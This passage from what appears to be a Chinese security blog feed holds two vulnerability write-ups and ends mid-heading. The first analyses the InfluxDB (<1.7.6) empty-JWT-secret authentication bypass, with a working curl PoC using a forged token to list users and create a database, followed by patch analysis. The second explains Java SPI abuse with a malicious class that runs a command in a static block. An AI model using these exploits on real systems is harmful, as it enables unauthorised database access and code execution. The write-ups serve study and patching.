SHA256（写成HS256）；typ属性表示这个令牌（token）的类型（type），JWT令牌统一写为JWT。</p><p>最后，将上面的JSON对象使用Base64URL算法转成字符串。</p><h5 id="Payload（载荷）"><a href="#Payload（载荷）" class="headerlink" title="Payload（载荷）"></a>Payload（载荷）</h5><p>Payload部分也是一个JSON对象，用来存放实际需要传递的数据。JWT规定了7个官方字段供选用：</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，JWT默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</strong></p><p>这个JSON对象也要使用Base64URL算法转成字符串。</p><h5 id="Signature（签名）"><a href="#Signature（签名）" class="headerlink" title="Signature（签名）"></a>Signature（签名）</h5><p>Signature部分是对前两部分的签名，防止数据篡改。</p><p>首先，<strong>需要指定一个密钥（secret）</strong>。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是HMAC SHA256），按照下面的公式产生签名：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把Header、Payload、Signature三个部分拼成一个字符串，每个部分之间用<code>.</code>分隔，就可以返回给用户。</p><h5 id="Base64URL算法"><a href="#Base64URL算法" class="headerlink" title="Base64URL算法"></a>Base64URL算法</h5><p>前面提到，Header和Payload串型化的算法是Base64URL。这个算法跟Base64算法基本类似，但有一些小的不同。</p><p>JWT作为一个令牌（token），有些场合可能会放到URL（比如api.example.com/?token=xxx）。Base64有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在URL里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是Base64URL算法。</p><h4 id="JWT的用法"><a href="#JWT的用法" class="headerlink" title="JWT的用法"></a>JWT的用法</h4><p>客户端收到服务器返回的JWT，可以储存在Cookie或LocalStorage中。</p><p>此后，客户端每次与服务器通信，都要带上这个JWT。你可以把它放在Cookie里面自动发送，但是这样不能跨域，所以更好的做法是放在HTTP请求的头信息<code>Authorization</code>字段里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><p>另一种做法是，跨域的时候JWT就放在POST请求的数据体里面。</p><h4 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h4><p>在线网站可生成JWT凭据：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><h2 id="0x02-Influxdb认证绕过漏洞"><a href="#0x02-Influxdb认证绕过漏洞" class="headerlink" title="0x02 Influxdb认证绕过漏洞"></a>0x02 Influxdb认证绕过漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Influxdb &lt; 1.7.6 的版本。</p><h3 id="漏洞原理及代码审计"><a href="#漏洞原理及代码审计" class="headerlink" title="漏洞原理及代码审计"></a>漏洞原理及代码审计</h3><p>Influxdb认证绕过漏洞，说白了就是默认的不安全配置导致的逻辑漏洞（未校验JWT的Signature部分的secret即密钥是否为空），可导致正常的身份认证被绕过。在Influxdb中，JWT的默认设置不会在“共享秘密”键中创建任何值。换句话说，默认情况下，创建有效的JWT令牌所需的“secret”为空。</p><p>下面我们下载1.7.5版本的Influxdb源码进行GO语言的代码审计，可控漏洞点出在哪里。</p><p>我们知道PoC是如下的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://xxx:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure><p>那么直接搜索关键词来寻找对应的认证代码，如搜索“Authorization”，找到influxdb-1.7.5\services\httpd\handler.go这个文件。在其中看到authenticate()即认证函数，这里会调用parseCredentials()函数来解析凭证，然后根据返回的凭证方法到下面的switch语句中匹配：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/2.png" alt=""></p><p>跟进parseCredentials()函数，当中获取Authorization头字段，若不为空，则通过空格切割其值，然后switch语句匹配第一个值的内容，当匹配到“Bearer”时则返回包含Method为“BearerAuthentication”的creds变量：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/3.png" alt=""></p><p>返回到authenticate()函数中，继续往下，就能匹配到switch语句的BearerAuthentication代码块：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/4.png" alt=""></p><p>这段代码解析到token具体的值后，获取其中声明的exp和username的值，这里exp需要满足float64类型的数值、username需要是个字符串类型，接着根据username即用户名去查找是否存在该用户，若都不报错则调用inner()函数成功往下执行，即认证成功。</p><p>在这里我们可以明显看到，我们的JWT的Signature部分的secret即密钥是可以设置为空的，因为这里没有对其是否为空进行校验，并且默认也是为空的，即：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + "." +</span><br><span class="line">  base64UrlEncode(payload),)</span><br></pre></td></tr></table></figure><p>由于没有使用密钥对前面两个部分的内容进行加密，因此任意用户只要知道用户名就可以构造JWT凭证来绕过认证。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里我们使用Docker来搭建漏洞环境。</p><p>依次执行如下命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索Influxdb Docker容器</span></span><br><span class="line">docker search influxdb</span><br><span class="line"><span class="comment"># 拉取漏洞版本的镜像</span></span><br><span class="line">docker pull influxdb:1.7.5</span><br><span class="line"><span class="comment"># 运行docker容器</span></span><br><span class="line">docker run -it -d --name influxdb -p 8086:8086 influxdb:1.7.5</span><br><span class="line"><span class="comment"># 进入运行的docker容器中</span></span><br><span class="line">docker <span class="built_in">exec</span> -it influxdb /bin/bash</span><br></pre></td></tr></table></figure><p>接着新建数据库用户，在influx终端运行如下命令创建新用户mi1k7ea：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; use _internal</span><br><span class="line">Using database _internal</span><br><span class="line">&gt; create user "mi1k7ea" with password '123456' with all privileges</span><br><span class="line">&gt; show users</span><br><span class="line">user    admin</span><br><span class="line"><span class="comment">----    -----</span></span><br><span class="line">mi1k7ea true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>然后在Influxdb的配置文件/etc/influxdb/influxdb.conf中添加配置开启认证：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/10.png" alt=""></p><p>然后重启即可。</p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先确定版本号是否存在漏洞，这里看到版本为1.7.5 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/6.png" alt=""></p><p>接着，判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/7.png" alt=""></p><p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p><p>下面的利用先在本地测试。</p><p>输入如下命令进行用户名发现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/debug/requests'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/8.png" alt=""></p><p>可以看到并没有返回数据库相关的用户名。</p><p>尝试直接访问/query接口，发现没有认证凭据不能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G -X POST <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/13.png" alt=""></p><h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>下面我们就来构造实现认证绕过的JWT。</p><p>由前面的分析知道，我们需要填写的仅仅是第二部分的Payload中的username和exp而已。这里username是Influxdb中存在的用户名即可，而exp (expiration time)即认证有效时间，需要我们设置得比当前时间大。</p><p>我们可以通过在线工具方便地获取：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/14.png" alt=""></p><p>除了线上的方法，这里列下几种编程语言生成时间戳的代码实现。</p><p>Java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">int</span>) (System.currentTimeMillis() / <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.time()</span><br></pre></td></tr></table></figure><p>PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time()</span><br></pre></td></tr></table></figure><p>这样，就可以直接到<code>https://jwt.io/</code>中构造JWT了，这里攻击者只需知道Influxdb数据库存在mi1k7ea用户即可（注意：第三部分Signature中的secret即密钥设置为空，因为默认都是无共享密钥的，即使目标服务端设置了我们也无从知道也无法利用）：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/12.png" alt=""></p><p>最终PoC如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=show users'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure><p>本地利用效果如图，成功查询得到用户信息：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/11.png" alt=""></p><p>修改下PoC的利用方式，添加新的数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G <span class="string">'http://127.0.0.1:8086/query'</span> --data-urlencode <span class="string">'q=create database hacked'</span> -H <span class="string">'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/15.png" alt=""></p><p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/9.png" alt=""></p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里下载1.7.6版本的Influxdb，打开influxdb-1.7.6\services\httpd\handler.go这个文件对比发现，在解析JWT之前多了一段代码：</p><p><img src="/2020/01/01/浅析Influxdb认证绕过漏洞/5.png" alt=""></p><p>可以看到该代码判断当前JWT的secret即密钥是否为空，若为空则直接报错，从而修补了漏洞。</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>升级Influxdb至最新版即可。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">When all else fails – find a 0-day</a></p><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="GO" scheme="https://www.mi1k7ea.com/categories/GO/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="GO" scheme="https://www.mi1k7ea.com/tags/GO/"/>
    
      <category term="Influxdb" scheme="https://www.mi1k7ea.com/tags/Influxdb/"/>
    
  </entry>
  
  <entry>
    <title>浅析Java SPI安全</title>
    <link href="https://www.mi1k7ea.com/2019/12/08/%E6%B5%85%E6%9E%90Java-SPI%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2019/12/08/浅析Java-SPI安全/</id>
    <published>2019-12-08T02:03:57.000Z</published>
    <updated>2019-12-29T14:30:50.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="SPI简介及思想"><a href="#SPI简介及思想" class="headerlink" title="SPI简介及思想"></a>SPI简介及思想</h3><p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，它可以用来启用框架扩展和替换组件。常见的SPI有JDBC、日志门面接口、Spring、SpringBoot相关starter组件、Dubbo、JNDI等。</p><p>Java SPI实际上是“基于接口的编程＋策略模式＋配置文件”组合实现的动态加载机制，在JDK中提供了工具类<code>java.util.ServiceLoader</code>来实现服务查找。</p><p>SPI的整体机制图如下：</p><p><img src="/2019/12/08/浅析Java-SPI安全/1.png" alt=""></p><blockquote><p>系统设计的各个抽象，往往有很多不同的实现方案，在面向的对象的设计里，一般推荐模块之间基于接口编程，模块之间不对实现类进行硬编码。一旦代码里涉及具体的实现类，就违反了可拔插的原则，如果需要替换一种实现，就需要修改代码。为了实现在模块装配的时候能不在程序里动态指明，这就需要一种服务发现机制。Java SPI就是提供这样的一个机制：为某个接口寻找服务实现的机制。有点类似IOC的思想，就是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要。所以SPI的核心思想就是解耦。</p><p>在Jdk 6里面引进的一个新的特性ServiceLoader，从官方的文档来说，它主要是用来装载一系列的Service Provider。而且ServiceLoader可以通过Service Provider的配置文件来装载指定的Service Provider。当服务的提供者，提供了服务接口的一种实现之后，我们只需要在jar包的META-INF/services/目录里同时创建一个以服务接口命名的文件。该文件里就是实现该服务接口的具体实现类。而当外部程序装配这个模块的时候，就能通过该jar包META-INF/services/里的配置文件找到具体的实现类名，并装载实例化，完成模块的注入。</p></blockquote><p>简单地说，SPI机制就是，服务端提供接口类和寻找服务的功能，客户端用户这边根据服务端提供的接口类来定义具体的实现类，然后服务端会在加载该实现类的时候去寻找该服务即META-INF/services/目录里的配置文件中指定的类。这就是SPI和传统的API的区别，API是服务端自己提供接口类并自己实现相应的类供客户端进行调用，而SPI则是提供接口类和服务寻找功能、具体的实现类由客户端实现并调用：</p><p><img src="/2019/12/08/浅析Java-SPI安全/10.png" alt=""></p><h3 id="SPI使用示例"><a href="#SPI使用示例" class="headerlink" title="SPI使用示例"></a>SPI使用示例</h3><p>SPI机制的实现，具体的实现类就是<code>java.util.ServiceLoader</code>这个类。其原理是根据传入的接口类，遍历<code>META-INF/services</code>目录下的以该类命名的文件中的所有类，并实例化返回。</p><p>SPI使用步骤：</p><ol><li>创建一个接口文件；</li><li>在resources目录下创建META-INF/services文件夹；</li><li>在services目录中创建文件，以接口全名命名该文件，称该文件为SPI配置文件；</li><li>创建接口实现类；</li><li>在SPI配置文件中填入接口实现类的全名；</li></ol><p>下面具体看下例子。</p><p>第一步，创建一个接口文件，Search.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Search</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;String&gt; <span class="title">searchDoc</span><span class="params">(String keyword)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，在resources目录即src下创建META-INF/services文件夹：</p><p><img src="/2019/12/08/浅析Java-SPI安全/2.png" alt=""></p><p>第三步，在services目录中创建文件，以接口全名命名该文件：</p><p><img src="/2019/12/08/浅析Java-SPI安全/3.png" alt=""></p><p>第四步，创建接口实现类，这里分别创建FileSearch.java和DatabaseSearch.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FileSearch.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileSearch</span> <span class="keyword">implements</span> <span class="title">Search</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">searchDoc</span><span class="params">(String keyword)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"文件搜索 "</span>+keyword);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DatabaseSearch.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseSearch</span> <span class="keyword">implements</span> <span class="title">Search</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">searchDoc</span><span class="params">(String keyword)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"数据搜索 "</span>+keyword);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第五步，在SPI配置文件中填入接口实现类的全名，这里先填FileSearch的：</p><p><img src="/2019/12/08/浅析Java-SPI安全/4.png" alt=""></p><p>最后，我们写一个测试程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ServiceLoader&lt;Search&gt; s = ServiceLoader.load(Search.class);</span><br><span class="line">        Iterator&lt;Search&gt; iterator = s.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Search search =  iterator.next();</span><br><span class="line">            search.searchDoc(<span class="string">"Java SPI Test"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件搜索 Java SPI Test</span><br></pre></td></tr></table></figure><p>如果SPI配置文件中的内容改为DatabaseSearch类的全名的话就输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据搜索 Java SPI Test</span><br></pre></td></tr></table></figure><p>若两个实现类都写入了，则两者都会进行输出。</p><p>这样就明显看到，实现方（或服务端）提供了接口类，具体调用哪个实现类由调用方（或客户端）通过SPI机制来指定调用。</p><h2 id="0x02-SPI安全问题"><a href="#0x02-SPI安全问题" class="headerlink" title="0x02 SPI安全问题"></a>0x02 SPI安全问题</h2><p>根据SPI的思想，我们知道服务端提供的接口类是用户自己实现的，但如果攻击者根据接口类编写恶意的实现类，然后通过某种方式修改ClassPath中META-INF/services目录中的对应的SPI配置文件后，就会导致服务端在通过SPI机制调用用户自定义的恶意实现类时的任意代码执行。</p><h3 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h3><p>Output.java，服务端提供的接口类，设计用来输出的接口类，在com.mi1k7ea包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outPut</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，服务端的通过SPI机制调用Output接口类的实现类的程序，在com.mi1k7ea包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mi1k7ea.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ServiceLoader&lt;Output&gt; s = ServiceLoader.load(Output.class);</span><br><span class="line">        Iterator&lt;Output&gt; iterator = s.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Output output =  iterator.next();</span><br><span class="line">            output.outPut();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>正常使用场景</strong></p><p>OutputImpl类，实现Output接口类，是正常用户通过SPI机制根据Output接口类来定义的，重写outPut()函数实现输出，在com.user包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OutputImpl</span> <span class="keyword">implements</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outPut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"I am OutputImpl."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>META-INF/services/com.mi1k7ea.Output，服务端Output接口类的SPI配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.user.OutputImpl</span><br></pre></td></tr></table></figure><p>运行服务端的Test，正常执行用户自定义实现的类并输出内容：</p><p><img src="/2019/12/08/浅析Java-SPI安全/5.png" alt=""></p><p><strong>问题场景</strong></p><p>Evil类，同样是用户根据SPI自定义实现Output接口类，但该类中添加了静态代码块来执行恶意命令（当然也可以在重写的方法中写入恶意代码，但服务端程序的调用实现类的时候不一定会调用该方法，因此写静态代码块才会必然使之触发）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outPut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is Evil."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>META-INF/services/com.mi1k7ea.Output，服务端Output接口类的SPI配置文件添加或直接修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.user.Evil</span><br></pre></td></tr></table></figure><p>运行服务端程序Test，即可触发弹计算器：</p><p><img src="/2019/12/08/浅析Java-SPI安全/6.png" alt=""></p><h3 id="反序列化Gadget——ScriptEngineManager"><a href="#反序列化Gadget——ScriptEngineManager" class="headerlink" title="反序列化Gadget——ScriptEngineManager"></a>反序列化Gadget——ScriptEngineManager</h3><p>反序列化漏洞利用的其中一个Gadget——ScriptEngineManager，其利用原理就是Java的SPI机制。</p><p>具体的利用和调试分析可参考：<a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8EScriptEngineManager%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">Java SnakeYaml反序列化漏洞</a></p><h3 id="Fastjson反序列化中的SPI"><a href="#Fastjson反序列化中的SPI" class="headerlink" 